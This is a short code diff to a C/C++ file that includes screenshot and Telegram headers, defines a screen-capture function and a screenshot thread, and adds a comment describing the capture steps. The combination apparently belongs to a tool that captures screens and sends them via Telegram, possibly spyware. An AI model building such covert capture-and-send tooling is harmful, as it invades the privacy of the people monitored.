@@ -1,6 +1,6 @@
 #include "../include/screenshot.h"
 #include "../include/telegram.h"
-
+// capScr() yea dimension , graphic resource , calculate pixel @ Encode image and clean also iamge 
 BYTE* capScr(DWORD* outSize) {
     *outSize = 0;
 
@@ -73,7 +73,6 @@ BYTE* capScr(DWORD* outSize) {
 
     return buffer;
 }
-
 DWORD WINAPI ScreenshotThread(LPVOID lpParam) {
     CoInitialize(NULL);
     GdiplusStartupInput gdiStartup;
